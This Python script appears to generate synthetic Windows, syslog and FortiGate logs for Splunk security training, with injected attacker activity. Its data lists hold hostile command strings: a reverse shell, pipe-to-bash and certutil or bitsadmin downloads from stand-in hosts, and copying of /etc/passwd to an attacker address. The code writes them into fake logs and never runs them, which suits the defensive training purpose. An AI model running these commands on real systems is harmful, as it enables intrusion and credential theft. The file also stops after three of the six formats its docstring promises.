#!/usr/bin/env python3
"""
Log Generator for Splunk Training & Lab Environments
=====================================================
Generates realistic logs in multiple formats with injectable suspicious events
for security analysis training.

Supported formats:
  - windows     : Windows Event Log (XML)
  - syslog      : Syslog RFC 3164 (Linux)
  - fortinet    : FortiGate firewall
  - cisco_asa   : Cisco ASA firewall
  - checkpoint  : Check Point firewall
  - paloalto    : Palo Alto Networks firewall

Author : Rafael Santos
License: GPL-3.0
"""

import argparse
import random
import signal
import sys
import time
import os
from abc import ABC, abstractmethod
from datetime import datetime, timedelta

# ---------------------------------------------------------------------------
# Shared data pools
# ---------------------------------------------------------------------------

INTERNAL_IPS = [
    "10.0.1.10", "10.0.1.25", "10.0.1.50", "10.0.1.101", "10.0.1.102",
    "10.0.2.10", "10.0.2.30", "10.0.2.55", "10.0.2.80", "10.0.2.200",
    "172.16.0.5", "172.16.0.20", "172.16.1.15", "172.16.1.100",
    "192.168.1.10", "192.168.1.50", "192.168.1.100", "192.168.1.200",
]

EXTERNAL_IPS = [
    "203.0.113.10", "203.0.113.45", "198.51.100.22", "198.51.100.78",
    "104.26.10.50", "172.217.14.206", "151.101.1.140", "13.107.42.14",
    "52.96.108.18", "20.190.151.70", "142.250.80.46", "44.238.100.5",
    "185.199.108.153", "93.184.216.34", "23.215.0.138",
]

SUSPICIOUS_IPS = [
    "45.155.205.99", "185.220.101.34", "91.219.236.222", "194.26.29.110",
    "23.129.64.130", "171.25.193.78", "162.247.74.27", "5.188.206.14",
    "77.247.181.163", "195.176.3.24",
]

HOSTNAMES_WINDOWS = [
    "WKS-PC001", "WKS-PC002", "WKS-PC003", "WKS-NB010", "WKS-NB011",
    "SRV-DC01", "SRV-DC02", "SRV-FILE01", "SRV-WEB01", "SRV-DB01",
    "SRV-EXCH01", "SRV-APP01", "SRV-PRINT01",
]

HOSTNAMES_LINUX = [
    "web-srv-01", "web-srv-02", "db-srv-01", "db-srv-02", "app-srv-01",
    "mail-srv-01", "proxy-srv-01", "dns-srv-01", "log-srv-01", "jump-srv-01",
    "k8s-node-01", "k8s-node-02", "docker-host-01",
]

HOSTNAMES_FW = [
    "FW-EDGE-01", "FW-EDGE-02", "FW-CORE-01", "FW-DMZ-01", "FW-BRANCH-01",
]

USERS_NORMAL = [
    "jsilva", "mfernandes", "acosta", "rsantos", "psouza",
    "cpereira", "loliveira", "acastro", "fmendes", "bribeiro",
    "mrocha", "dfreitas", "tlima", "ggomes", "nalmeida",
]

USERS_ADMIN = ["admin", "svc.backup", "svc.monitor", "sysadmin", "root"]

USERS_SUSPICIOUS = ["guest", "test", "temp_admin", "debug_user", "scanner"]

DOMAINS = ["corp.local", "empresa.local", "hq.internal"]

COMMON_PORTS = [80, 443, 8080, 8443, 53, 25, 110, 143, 993, 3389, 22, 445, 139]

SUSPICIOUS_PORTS = [4444, 5555, 6666, 1337, 31337, 9001, 8888, 12345, 54321]

PROTOCOLS = ["TCP", "UDP"]

DNS_QUERIES_NORMAL = [
    "www.google.com", "outlook.office365.com", "teams.microsoft.com",
    "github.com", "api.slack.com", "cdn.jsdelivr.net", "update.microsoft.com",
]

DNS_QUERIES_SUSPICIOUS = [
    "c2-relay.darknet.xyz", "data-exfil.evil.cc",
    "aHR0cHM6Ly9tYWx3YXJl.xyz", "cmd-ctrl-0x41.top",
    "xn--80ak6aa92e.cc", "update-service-cdn.ru",
]

WINDOWS_PROCESSES_NORMAL = [
    "svchost.exe", "explorer.exe", "chrome.exe", "outlook.exe",
    "teams.exe", "OneDrive.exe", "SearchIndexer.exe", "spoolsv.exe",
    "taskhostw.exe", "RuntimeBroker.exe", "MsMpEng.exe",
]

WINDOWS_PROCESSES_SUSPICIOUS = [
    "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ==",
    "cmd.exe /c whoami /priv",
    "certutil.exe -urlcache -split -f http://evil.cc/payload.exe",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
    "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\")\")",
    "bitsadmin.exe /transfer evil /download http://c2.bad/mal.exe",
    "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "mimikatz.exe",
    "psexec.exe \\\\SRV-DC01 -s cmd.exe",
]

LINUX_COMMANDS_SUSPICIOUS = [
    "/bin/bash -i >& /dev/tcp/45.155.205.99/4444 0>&1",
    "curl http://c2-relay.darknet.xyz/shell.sh | bash",
    "wget -q http://91.219.236.222/miner -O /tmp/.hidden && chmod +x /tmp/.hidden",
    "cat /etc/shadow",
    "nmap -sS -p- 10.0.1.0/24",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "crontab -l; echo '*/5 * * * * /tmp/.backdoor' | crontab -",
    "scp /etc/passwd attacker@194.26.29.110:/loot/",
]

URL_CATEGORIES_NORMAL = [
    "Search Engines", "Business", "Cloud Infrastructure", "Technology",
    "Education", "News", "Social Networking",
]

URL_CATEGORIES_SUSPICIOUS = [
    "Malware", "Phishing", "Command and Control", "Newly Registered Domain",
    "Dynamic DNS", "Proxy Avoidance",
]

THREAT_NAMES = [
    "Trojan.Gen.2", "Exploit.CVE-2024-1234", "Backdoor.Cobalt.Strike",
    "Ransomware.LockBit", "Spyware.Keylogger.A", "Worm.Conficker.C",
    "Miner.CoinMiner.D", "Rootkit.Hidden.B", "Adware.BrowserHelper.E",
    "PUA.CryptoMiner", "Exploit.EternalBlue",
]

FW_INTERFACES = ["port1", "port2", "port3", "port4", "dmz", "wan1", "wan2"]

SYSLOG_FACILITIES = {
    "kern": 0, "user": 1, "mail": 2, "daemon": 3, "auth": 4,
    "syslog": 5, "lpr": 6, "cron": 9, "authpriv": 10, "local0": 16,
}

SYSLOG_SEVERITIES = {
    "emerg": 0, "alert": 1, "crit": 2, "err": 3,
    "warning": 4, "notice": 5, "info": 6, "debug": 7,
}

MONTHS_ABBR = [
    "Jan", "Feb", "Mar", "Apr", "May", "Jun",
    "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
]


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def rfc3164_timestamp(dt: datetime) -> str:
    """Format a datetime as RFC 3164 timestamp: 'Mon DD HH:MM:SS'."""
    day = f"{dt.day:>2d}"
    return f"{MONTHS_ABBR[dt.month - 1]} {day} {dt.strftime('%H:%M:%S')}"


def pri_value(facility: str, severity: str) -> int:
    """Calculate PRI value for syslog."""
    return SYSLOG_FACILITIES.get(facility, 1) * 8 + SYSLOG_SEVERITIES.get(severity, 6)


def random_timestamp(base: datetime | None = None, jitter_seconds: int = 2) -> datetime:
    """Return a slightly jittered timestamp around *base* (default: now)."""
    base = base or datetime.now()
    offset = random.uniform(-jitter_seconds, jitter_seconds)
    return base + timedelta(seconds=offset)


def random_session_id() -> str:
    return f"0x{random.randint(0x100000, 0xFFFFFF):X}"


def random_logon_id() -> str:
    return f"0x{random.randint(0x10000, 0xFFFFF):X}"


def random_guid() -> str:
    parts = [
        f"{random.randint(0, 0xFFFFFFFF):08X}",
        f"{random.randint(0, 0xFFFF):04X}",
        f"{random.randint(0, 0xFFFF):04X}",
        f"{random.randint(0, 0xFFFF):04X}",
        f"{random.randint(0, 0xFFFFFFFFFFFF):012X}",
    ]
    return "-".join(parts)


def random_bytes(low: int = 200, high: int = 150_000) -> int:
    return random.randint(low, high)


# ---------------------------------------------------------------------------
# Base generator
# ---------------------------------------------------------------------------

class LogGenerator(ABC):
    """Abstract base for all log generators."""

    name: str = "base"
    description: str = ""

    @abstractmethod
    def generate_normal(self, ts: datetime) -> str:
        ...

    @abstractmethod
    def generate_suspicious(self, ts: datetime) -> str:
        ...

    def generate(self, ts: datetime, suspicious: bool = False) -> str:
        if suspicious:
            return self.generate_suspicious(ts)
        return self.generate_normal(ts)


# ---------------------------------------------------------------------------
# Windows Event Log (XML)
# ---------------------------------------------------------------------------

class WindowsXMLGenerator(LogGenerator):
    name = "windows"
    description = "Windows Event Log (XML format)"

    # Normal events: logon success, logoff, service start, process create
    NORMAL_TEMPLATES = [
        # 4624 — Successful Logon
        {
            "event_id": 4624,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Logon",
            "opcode": "Info",
            "keywords": "Audit Success",
        },
        # 4634 — Logoff
        {
            "event_id": 4634,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Logoff",
            "opcode": "Info",
            "keywords": "Audit Success",
        },
        # 7036 — Service entered running state
        {
            "event_id": 7036,
            "level": 4,
            "level_text": "Information",
            "channel": "System",
            "provider": "Service Control Manager",
            "task": "None",
            "opcode": "Info",
            "keywords": "Classic",
        },
        # 4688 — New process created (normal)
        {
            "event_id": 4688,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Process Creation",
            "opcode": "Info",
            "keywords": "Audit Success",
        },
    ]

    SUSPICIOUS_EVENTS = [
        # 4625 — Failed Logon
        {
            "event_id": 4625,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Logon",
            "opcode": "Info",
            "keywords": "Audit Failure",
            "label": "brute_force_attempt",
        },
        # 4720 — User Account Created
        {
            "event_id": 4720,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "User Account Management",
            "opcode": "Info",
            "keywords": "Audit Success",
            "label": "suspicious_account_creation",
        },
        # 4672 — Special Privileges Assigned
        {
            "event_id": 4672,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Special Logon",
            "opcode": "Info",
            "keywords": "Audit Success",
            "label": "privilege_escalation",
        },
        # 1102 — Audit Log Cleared
        {
            "event_id": 1102,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Eventlog",
            "task": "Log clear",
            "opcode": "Info",
            "keywords": "Audit Success",
            "label": "log_tampering",
        },
        # 4688 — Suspicious Process Created
        {
            "event_id": 4688,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Process Creation",
            "opcode": "Info",
            "keywords": "Audit Success",
            "label": "suspicious_process",
        },
        # 4697 — Service Installed
        {
            "event_id": 4697,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Security System Extension",
            "opcode": "Info",
            "keywords": "Audit Success",
            "label": "suspicious_service_install",
        },
        # 4732 — Member Added to Security-Enabled Local Group
        {
            "event_id": 4732,
            "level": 0,
            "level_text": "Information",
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "task": "Security Group Management",
            "opcode": "Info",
            "keywords": "Audit Success",
            "label": "group_modification",
        },
    ]

    def _xml_event(self, template: dict, ts: datetime, event_data: str) -> str:
        hostname = random.choice(HOSTNAMES_WINDOWS)
        domain = random.choice(DOMAINS)
        iso_ts = ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        guid = random_guid()
        record_id = random.randint(100000, 999999)

        return (
            f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
            f"<System>"
            f"<Provider Name='{template['provider']}' Guid='{{{guid}}}'/>"
            f"<EventID>{template['event_id']}</EventID>"
            f"<Version>0</Version>"
            f"<Level>{template['level']}</Level>"
            f"<Task>{template['task']}</Task>"
            f"<Opcode>{template['opcode']}</Opcode>"
            f"<Keywords>{template['keywords']}</Keywords>"
            f"<TimeCreated SystemTime='{iso_ts}'/>"
            f"<EventRecordID>{record_id}</EventRecordID>"
            f"<Channel>{template['channel']}</Channel>"
            f"<Computer>{hostname}.{domain}</Computer>"
            f"</System>"
            f"<EventData>{event_data}</EventData>"
            f"</Event>"
        )

    def generate_normal(self, ts: datetime) -> str:
        template = random.choice(self.NORMAL_TEMPLATES)
        user = random.choice(USERS_NORMAL)
        domain = random.choice(DOMAINS).split(".")[0].upper()
        hostname = random.choice(HOSTNAMES_WINDOWS)
        src_ip = random.choice(INTERNAL_IPS)

        if template["event_id"] == 4624:
            logon_type = random.choice([2, 3, 7, 10])
            data = (
                f"<Data Name='SubjectUserSid'>S-1-5-18</Data>"
                f"<Data Name='SubjectUserName'>{hostname}$</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='SubjectLogonId'>{random_logon_id()}</Data>"
                f"<Data Name='TargetUserSid'>S-1-5-21-{random.randint(1000000,9999999)}-{random.randint(1000,9999)}</Data>"
                f"<Data Name='TargetUserName'>{user}</Data>"
                f"<Data Name='TargetDomainName'>{domain}</Data>"
                f"<Data Name='TargetLogonId'>{random_logon_id()}</Data>"
                f"<Data Name='LogonType'>{logon_type}</Data>"
                f"<Data Name='IpAddress'>{src_ip}</Data>"
                f"<Data Name='IpPort'>{random.randint(49152, 65535)}</Data>"
                f"<Data Name='WorkstationName'>{hostname}</Data>"
            )
        elif template["event_id"] == 4634:
            data = (
                f"<Data Name='TargetUserName'>{user}</Data>"
                f"<Data Name='TargetDomainName'>{domain}</Data>"
                f"<Data Name='TargetLogonId'>{random_logon_id()}</Data>"
                f"<Data Name='LogonType'>{random.choice([2, 3, 7])}</Data>"
            )
        elif template["event_id"] == 7036:
            services = [
                "Windows Update", "Windows Defender", "DHCP Client",
                "DNS Client", "Print Spooler", "Task Scheduler",
                "Windows Firewall", "Workstation",
            ]
            state = random.choice(["running", "stopped"])
            svc = random.choice(services)
            data = (
                f"<Data Name='param1'>{svc}</Data>"
                f"<Data Name='param2'>{state}</Data>"
            )
        else:  # 4688 normal process
            proc = random.choice(WINDOWS_PROCESSES_NORMAL)
            data = (
                f"<Data Name='SubjectUserName'>{user}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='SubjectLogonId'>{random_logon_id()}</Data>"
                f"<Data Name='NewProcessName'>C:\\Windows\\System32\\{proc}</Data>"
                f"<Data Name='ProcessId'>{random.randint(1000, 30000)}</Data>"
                f"<Data Name='CommandLine'>{proc}</Data>"
                f"<Data Name='ParentProcessName'>C:\\Windows\\System32\\svchost.exe</Data>"
            )

        return self._xml_event(template, ts, data)

    def generate_suspicious(self, ts: datetime) -> str:
        template = random.choice(self.SUSPICIOUS_EVENTS)
        domain = random.choice(DOMAINS).split(".")[0].upper()
        hostname = random.choice(HOSTNAMES_WINDOWS)
        label = template.get("label", "unknown")

        if template["event_id"] == 4625:
            user = random.choice(USERS_NORMAL + ["administrator", "admin", "sa"])
            src_ip = random.choice(SUSPICIOUS_IPS + EXTERNAL_IPS)
            failure_reason = random.choice([
                "%%2313",  # Unknown user name or bad password
                "%%2304",  # Account locked out
            ])
            data = (
                f"<Data Name='TargetUserName'>{user}</Data>"
                f"<Data Name='TargetDomainName'>{domain}</Data>"
                f"<Data Name='Status'>0xC000006D</Data>"
                f"<Data Name='FailureReason'>{failure_reason}</Data>"
                f"<Data Name='SubStatus'>0xC000006A</Data>"
                f"<Data Name='LogonType'>3</Data>"
                f"<Data Name='IpAddress'>{src_ip}</Data>"
                f"<Data Name='IpPort'>{random.randint(49152, 65535)}</Data>"
                f"<Data Name='WorkstationName'>{hostname}</Data>"
                f"<!-- SUSPICIOUS: {label} from {src_ip} -->"
            )
        elif template["event_id"] == 4720:
            actor = random.choice(USERS_SUSPICIOUS)
            new_user = random.choice(["backdoor_usr", "temp$", "svc_debug", "testadmin"])
            data = (
                f"<Data Name='TargetUserName'>{new_user}</Data>"
                f"<Data Name='TargetDomainName'>{domain}</Data>"
                f"<Data Name='SubjectUserName'>{actor}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='SubjectLogonId'>{random_logon_id()}</Data>"
                f"<!-- SUSPICIOUS: {label} — account '{new_user}' created by '{actor}' -->"
            )
        elif template["event_id"] == 4672:
            user = random.choice(USERS_SUSPICIOUS + ["guest"])
            privs = "SeDebugPrivilege SeImpersonatePrivilege SeTcbPrivilege"
            data = (
                f"<Data Name='SubjectUserName'>{user}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='SubjectLogonId'>{random_logon_id()}</Data>"
                f"<Data Name='PrivilegeList'>{privs}</Data>"
                f"<!-- SUSPICIOUS: {label} — elevated privileges assigned to '{user}' -->"
            )
        elif template["event_id"] == 1102:
            user = random.choice(USERS_SUSPICIOUS)
            data = (
                f"<Data Name='SubjectUserName'>{user}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='SubjectLogonId'>{random_logon_id()}</Data>"
                f"<!-- SUSPICIOUS: {label} — audit log cleared by '{user}' -->"
            )
        elif template["event_id"] == 4688:
            user = random.choice(USERS_SUSPICIOUS + USERS_NORMAL[:3])
            proc_cmd = random.choice(WINDOWS_PROCESSES_SUSPICIOUS)
            proc_name = proc_cmd.split()[0] if " " in proc_cmd else proc_cmd
            data = (
                f"<Data Name='SubjectUserName'>{user}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='SubjectLogonId'>{random_logon_id()}</Data>"
                f"<Data Name='NewProcessName'>C:\\Windows\\System32\\{proc_name}</Data>"
                f"<Data Name='ProcessId'>{random.randint(1000, 30000)}</Data>"
                f"<Data Name='CommandLine'>{proc_cmd}</Data>"
                f"<Data Name='ParentProcessName'>C:\\Windows\\System32\\cmd.exe</Data>"
                f"<!-- SUSPICIOUS: {label} — '{proc_cmd}' -->"
            )
        elif template["event_id"] == 4697:
            svc_name = random.choice(["EvilSvc", "WindowsUpdateHelper", "ChromeUpdater", "SystemHealthd"])
            svc_file = random.choice([
                "C:\\ProgramData\\svc.exe",
                "C:\\Users\\Public\\update.exe",
                "C:\\Windows\\Temp\\helper.exe",
            ])
            user = random.choice(USERS_SUSPICIOUS)
            data = (
                f"<Data Name='SubjectUserName'>{user}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<Data Name='ServiceName'>{svc_name}</Data>"
                f"<Data Name='ServiceFileName'>{svc_file}</Data>"
                f"<Data Name='ServiceType'>0x10</Data>"
                f"<Data Name='ServiceStartType'>2</Data>"
                f"<!-- SUSPICIOUS: {label} — service '{svc_name}' installed by '{user}' -->"
            )
        else:  # 4732
            user = random.choice(USERS_SUSPICIOUS)
            target = random.choice(USERS_SUSPICIOUS)
            data = (
                f"<Data Name='MemberName'>{target}</Data>"
                f"<Data Name='MemberSid'>S-1-5-21-{random.randint(1000000,9999999)}-{random.randint(1000,9999)}</Data>"
                f"<Data Name='TargetUserName'>Administrators</Data>"
                f"<Data Name='TargetDomainName'>Builtin</Data>"
                f"<Data Name='SubjectUserName'>{user}</Data>"
                f"<Data Name='SubjectDomainName'>{domain}</Data>"
                f"<!-- SUSPICIOUS: {label} — '{target}' added to Administrators by '{user}' -->"
            )

        return self._xml_event(template, ts, data)


# ---------------------------------------------------------------------------
# Syslog RFC 3164 (Linux)
# ---------------------------------------------------------------------------

class SyslogGenerator(LogGenerator):
    name = "syslog"
    description = "Syslog RFC 3164 (Linux)"

    def _syslog_line(self, facility: str, severity: str, ts: datetime,
                     hostname: str, app: str, pid: int | None, msg: str) -> str:
        pri = pri_value(facility, severity)
        ts_str = rfc3164_timestamp(ts)
        pid_part = f"[{pid}]" if pid is not None else ""
        return f"<{pri}>{ts_str} {hostname} {app}{pid_part}: {msg}"

    def generate_normal(self, ts: datetime) -> str:
        host = random.choice(HOSTNAMES_LINUX)
        kind = random.choice(["sshd", "cron", "systemd", "kernel", "dhclient", "sudo_ok", "postfix"])

        if kind == "sshd":
            user = random.choice(USERS_NORMAL)
            src = random.choice(INTERNAL_IPS)
            port = random.randint(49152, 65535)
            msg = f"Accepted publickey for {user} from {src} port {port} ssh2: RSA SHA256:{''.join(random.choices('abcdef0123456789', k=43))}"
            return self._syslog_line("authpriv", "info", ts, host, "sshd", random.randint(1000, 30000), msg)

        if kind == "cron":
            user = random.choice(USERS_NORMAL + ["root"])
            cmd = random.choice([
                "/usr/lib/sa/sa1 1 1",
                "/usr/bin/logrotate /etc/logrotate.conf",
                "/opt/scripts/backup.sh",
                "/usr/bin/find /tmp -mtime +7 -delete",
            ])
            msg = f"({user}) CMD ({cmd})"
            return self._syslog_line("cron", "info", ts, host, "CRON", random.randint(1000, 60000), msg)

        if kind == "systemd":
            units = [
                "nginx.service", "sshd.service", "docker.service", "postgresql.service",
                "cron.service", "rsyslog.service", "auditd.service",
            ]
            action = random.choice(["Started", "Stopped", "Reloaded"])
            unit = random.choice(units)
            msg = f"{action} {unit.replace('.service', '')}."
            return self._syslog_line("daemon", "info", ts, host, "systemd", 1, msg)

        if kind == "kernel":
            msgs = [
                f"[UFW ALLOW] IN=eth0 OUT= SRC={random.choice(INTERNAL_IPS)} DST={random.choice(INTERNAL_IPS)} PROTO=TCP SPT={random.randint(1024,65535)} DPT={random.choice(COMMON_PORTS)}",
                f"eth0: link up at 1000 Mbps, full duplex",
                f"TCP: request_sock_TCP: Possible SYN flooding on port {random.choice(COMMON_PORTS)}. Sending cookies.",
            ]
            return self._syslog_line("kern", "info", ts, host, "kernel", None, random.choice(msgs[:2]))

        if kind == "dhclient":
            ip = random.choice(INTERNAL_IPS)
            msg = f"DHCPACK of {ip} from 10.0.1.1"
            return self._syslog_line("daemon", "info", ts, host, "dhclient", random.randint(1000, 5000), msg)

        if kind == "sudo_ok":
            user = random.choice(USERS_NORMAL)
            cmd = random.choice(["systemctl restart nginx", "apt update", "tail -f /var/log/syslog", "cat /var/log/auth.log"])
            msg = f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/{cmd.split()[0]} {' '.join(cmd.split()[1:])}"
            return self._syslog_line("authpriv", "notice", ts, host, "sudo", None, msg)

        # postfix
        queue_id = ''.join(random.choices("ABCDEF0123456789", k=10))
        user = random.choice(USERS_NORMAL)
        msg = f"{queue_id}: to=<{user}@empresa.com>, relay=mail.empresa.com[127.0.0.1]:25, status=sent (250 2.0.0 Ok)"
        return self._syslog_line("mail", "info", ts, host, "postfix/smtp", random.randint(1000, 30000), msg)

    def generate_suspicious(self, ts: datetime) -> str:
        host = random.choice(HOSTNAMES_LINUX)
        kind = random.choice([
            "ssh_fail", "sudo_fail", "reverse_shell", "suspicious_cmd",
            "kernel_alert", "auth_escalation", "cron_persist",
        ])

        if kind == "ssh_fail":
            user = random.choice(["root", "admin", "test", "ubuntu", "pi"])
            src = random.choice(SUSPICIOUS_IPS)
            port = random.randint(49152, 65535)
            msg = f"Failed password for invalid user {user} from {src} port {port} ssh2"
            return self._syslog_line("authpriv", "warning", ts, host, "sshd", random.randint(1000, 30000), msg)

        if kind == "sudo_fail":
            user = random.choice(USERS_SUSPICIOUS)
            cmd = random.choice(["su -", "bash", "passwd root", "cat /etc/shadow"])
            msg = f"{user} : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/{cmd.split()[0]}"
            return self._syslog_line("authpriv", "alert", ts, host, "sudo", None, msg)

        if kind == "reverse_shell":
            cmd = random.choice(LINUX_COMMANDS_SUSPICIOUS[:3])
            user = random.choice(USERS_SUSPICIOUS + USERS_NORMAL[:2])
            msg = f"session opened for user {user}: executing '{cmd}'"
            return self._syslog_line("auth", "crit", ts, host, "bash", random.randint(1000, 30000), msg)

        if kind == "suspicious_cmd":
            cmd = random.choice(LINUX_COMMANDS_SUSPICIOUS[3:])
            user = random.choice(USERS_SUSPICIOUS)
            msg = f"{user} : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND={cmd}"
            return self._syslog_line("authpriv", "alert", ts, host, "sudo", None, msg)

        if kind == "kernel_alert":
            msgs = [
                f"Possible SYN flooding on port {random.choice(COMMON_PORTS)}. Sending cookies. Check SNMP counters.",
                f"segfault at 0000000000000000 ip 00007f3b2c1a rsp 00007ffd8a3e error 4 in libc.so",
                f"Out of memory: Killed process {random.randint(1000, 30000)} (java) total-vm:{random.randint(2000000, 8000000)}kB",
            ]
            return self._syslog_line("kern", "crit", ts, host, "kernel", None, random.choice(msgs))

        if kind == "auth_escalation":
            user = random.choice(USERS_SUSPICIOUS)
            msg = f"pam_unix(su:auth): authentication failure; logname={user} uid={random.randint(1000, 5000)} euid=0 tty=pts/3 ruser={user} rhost="
            return self._syslog_line("auth", "alert", ts, host, "su", random.randint(1000, 10000), msg)

        # cron_persist
        user = random.choice(USERS_SUSPICIOUS)
        msg = f"({user}) REPLACE ({user}): adding cronjob '*/5 * * * * /tmp/.backdoor --silent'"
        return self._syslog_line("cron", "warning", ts, host, "crontab", random.randint(1000, 10000), msg)


# ---------------------------------------------------------------------------
# Fortinet FortiGate
# ---------------------------------------------------------------------------

class FortinetGenerator(LogGenerator):
    name = "fortinet"
    description = "Fortinet FortiGate firewall"

    def _base_fields(self, ts: datetime, log_type: str, subtype: str, level: str) -> str:
        fw = random.choice(HOSTNAMES_FW)
        serial = f"FGT60F{random.randint(1000000000, 9999999999)}"
        ts_str = ts.strftime("%Y-%m-%d %H:%M:%S")
        log_id = random.randint(1000000, 9999999)
        return (
            f'date={ts.strftime("%Y-%m-%d")} time={ts.strftime("%H:%M:%S")} '
            f'devname="{fw}" devid="{serial}" '
            f'eventtime={int(ts.timestamp())} '
            f'logid="{log_id:07d}" type="{log_type}" subtype="{subtype}" level="{level}"'
        )

    def generate_normal(self, ts: datetime) -> str:
        src_ip = random.choice(INTERNAL_IPS)
        dst_ip = random.choice(EXTERNAL_IPS)
        src_port = random.randint(49152, 65535)
        dst_port = random.choice(COMMON_PORTS)
        proto = random.choice(PROTOCOLS)
        policy_id = random.randint(1, 50)
        sent = random_bytes(500, 50000)
        rcvd = random_bytes(200, 200000)
        duration = random.randint(1, 300)
        iface_in = random.choice(["port1", "port2", "port3"])
        iface_out = random.choice(["wan1", "wan2"])
        session_id = random.randint(100000, 9999999)
        user = random.choice(USERS_NORMAL)

        base = self._base_fields(ts, "traffic", "forward", "notice")
        return (
            f'{base} vd="root" '
            f'srcip={src_ip} srcport={src_port} srcintf="{iface_in}" '
            f'dstip={dst_ip} dstport={dst_port} dstintf="{iface_out}" '
            f'proto={6 if proto == "TCP" else 17} action="accept" '
            f'policyid={policy_id} policyname="LAN-to-WAN" '
            f'user="{user}" group="Domain Users" '
            f'sessionid={session_id} duration={duration} '
            f'sentbyte={sent} rcvdbyte={rcvd} '
            f'service="{self._port_to_service(dst_port)}" '
            f'appcat="unscanned"'
        )

    def generate_suspicious(self, ts: datetime) -> str:
        kind = random.choice(["denied", "ips", "exfil", "c2"])
        src_ip = random.choice(SUSPICIOUS_IPS) if kind != "exfil" else random.choice(INTERNAL_IPS)
        dst_ip = random.choice(INTERNAL_IPS) if kind == "denied" else random.choice(SUSPICIOUS_IPS)

        if kind == "exfil":
            dst_ip = random.choice(SUSPICIOUS_IPS)

        if kind == "denied":
            dst_port = random.choice(SUSPICIOUS_PORTS + [22, 3389, 445])
            base = self._base_fields(ts, "traffic", "forward", "warning")
            return (
                f'{base} vd="root" '
                f'srcip={src_ip} srcport={random.randint(49152, 65535)} srcintf="wan1" '
                f'dstip={dst_ip} dstport={dst_port} dstintf="port1" '
                f'proto=6 action="deny" policyid=0 policyname="implicit-deny" '
                f'sessionid={random.randint(100000, 9999999)} duration=0 '
                f'sentbyte=0 rcvdbyte=0 '
                f'msg="SUSPICIOUS: inbound connection denied from known malicious IP"'
            )

        if kind == "ips":
            threat = random.choice(THREAT_NAMES)
            base = self._base_fields(ts, "utm", "ips", "alert")
            return (
                f'{base} vd="root" '
                f'srcip={src_ip} srcport={random.randint(49152, 65535)} srcintf="wan1" '
                f'dstip={random.choice(INTERNAL_IPS)} dstport={random.choice(COMMON_PORTS)} dstintf="port1" '
                f'proto=6 action="dropped" '
                f'attack="{threat}" severity="critical" '
                f'ref="https://fortiguard.com/encyclopedia" '
                f'msg="SUSPICIOUS: IPS signature match — {threat}"'
            )

        if kind == "exfil":
            sent = random.randint(500_000_000, 2_000_000_000)  # 500MB–2GB
            base = self._base_fields(ts, "traffic", "forward", "warning")
            user = random.choice(USERS_SUSPICIOUS + USERS_NORMAL[:2])
            return (
                f'{base} vd="root" '
                f'srcip={src_ip} srcport={random.randint(49152, 65535)} srcintf="port1" '
                f'dstip={dst_ip} dstport=443 dstintf="wan1" '
                f'proto=6 action="accept" '
                f'policyid={random.randint(1, 50)} policyname="LAN-to-WAN" '
                f'user="{user}" '
                f'sessionid={random.randint(100000, 9999999)} duration={random.randint(60, 600)} '
                f'sentbyte={sent} rcvdbyte={random.randint(1000, 5000)} '
                f'msg="SUSPICIOUS: large data exfiltration — {sent} bytes to {dst_ip}"'
            )

        # c2
        base = self._base_fields(ts, "utm", "webfilter", "warning")
        c2_domain = random.choice(DNS_QUERIES_SUSPICIOUS)
        return (
            f'{base} vd="root" '
            f'srcip={random.choice(INTERNAL_IPS)} srcport={random.randint(49152, 65535)} srcintf="port1" '
            f'dstip={random.choice(SUSPICIOUS_IPS)} dstport=443 dstintf="wan1" '
            f'proto=6 action="blocked" '
            f'hostname="{c2_domain}" '
            f'catdesc="{random.choice(URL_CATEGORIES_SUSPICIOUS)}" '
            f'msg="SUSPICIOUS: C2 beacon attempt to {c2_domain}"'
        )

    @staticmethod
    def _port_to_service(port: int) -> str:
        return {80: "HTTP", 443: "HTTPS", 53: "DNS", 22: "SSH", 25: "SMTP",
                3389: "RDP", 445: "SMB", 8080: "HTTP-ALT", 8443: "HTTPS-ALT",
                110: "POP3", 143: "IMAP", 993: "IMAPS"}.get(port, f"tcp/{port}")


